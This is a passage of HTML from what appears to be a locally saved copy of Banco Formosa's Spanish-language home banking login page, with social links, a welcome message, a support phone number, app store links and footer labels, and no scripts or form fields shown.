                    <img _ngcontent-c5="" src="./token_files/icon-facebook.png">
                  </a>
                  <a _ngcontent-c5="" target="_blank" href="https://twitter.com/BancoFormosa">
                    <img _ngcontent-c5="" src="./token_files/icon-twitter.png">
                  </a>
                  <a _ngcontent-c5="" target="_blank" href="https://www.instagram.com/banco_formosa/">
                    <img _ngcontent-c5="" class="remove-margin" src="./token_files/icon-instagram.png">
                  </a>
                </div>
              </div>
              <div _ngcontent-c5="" class="body">
                <div _ngcontent-c5="" class="info">
                  <h1 _ngcontent-c5="">Te damos la bienvenida a nuestro nuevo Home Banking</h1>
                  <p _ngcontent-c5="">Estamos mejorando constantemente para vos, nuestro nuevo Home Banking es más
                    moderno y más fácil de usar, con más funcionalidades y beneficios.</p>
                </div>
                <div _ngcontent-c5="" class="login-box">
                  <!---->
                  <h1 _ngcontent-c5="">
                    Bienvenido <br _ngcontent-c5="">
                    a tu banco online
                  </h1>





                  <div _ngcontent-c5="" class="mobileInfo">
                    <div _ngcontent-c5="" class="nets margin-top">
                      <a _ngcontent-c5="" target="_blank" href="https://www.facebook.com/BancoFormosaOficial/">
                        <img _ngcontent-c5="" src="./token_files/icon-facebook.png">
                      </a>
                      <a _ngcontent-c5="" target="_blank" href="https://twitter.com/BancoFormosa">
                        <img _ngcontent-c5="" src="./token_files/icon-twitter.png">
                      </a>
                      <a _ngcontent-c5="" target="_blank" href="https://www.instagram.com/banco_formosa/">
                        <img _ngcontent-c5="" class="remove-margin" src="./token_files/icon-instagram.png">
                      </a>
                    </div>
                    <div _ngcontent-c5="" class="tels margin-top">
                      <img _ngcontent-c5="" src="./token_files/icon-tel.png">
                      <div _ngcontent-c5="" class="data">
                        <h3 _ngcontent-c5="">0800 777 2262</h3>
                        <p _ngcontent-c5="">Lunes a Viernes 7 a 19 Hs.</p>
                      </div>
                    </div>
                    <h3 _ngcontent-c5="" class="margin-top">Descarga nuestra App</h3>
                    <div _ngcontent-c5="" class="apps">
                      <a _ngcontent-c5="" target="_blank" href="https://apps.apple.com/ar/app/banco-formosa/id1544991292">
                        <img _ngcontent-c5="" src="./token_files/apple.png">
                      </a>
                      <a _ngcontent-c5="" target="_blank" href="https://play.google.com/store/apps/details?id=ar.com.bcofsa">
                        <img _ngcontent-c5="" src="./token_files/android.png">
                      </a>
                    </div>
                  </div>
                </div>
              </div>

              <div _ngcontent-c5="" class="footer">
                <a _ngcontent-c5="" class="link">
                  Términos y Condiciones
                </a>
                <a _ngcontent-c5="" class="link">
                  Información de seguridad
                </a>

                <a _ngcontent-c5="" class="link">
                  Políticas de privacidad
                </a>
                <a _ngcontent-c5="" class="link">
                  Sucursales &amp; Cajeros
                </a>
                <a _ngcontent-c5="" class="link">
                  Comparación de comisiones
                </a>
              </div>
            </div>
          </div>








        </app-login>
      </div>

      <!---->








      <!---->
      <!---->
      <!---->
    </div>
    <!---->
  </app-root>




</body></html>
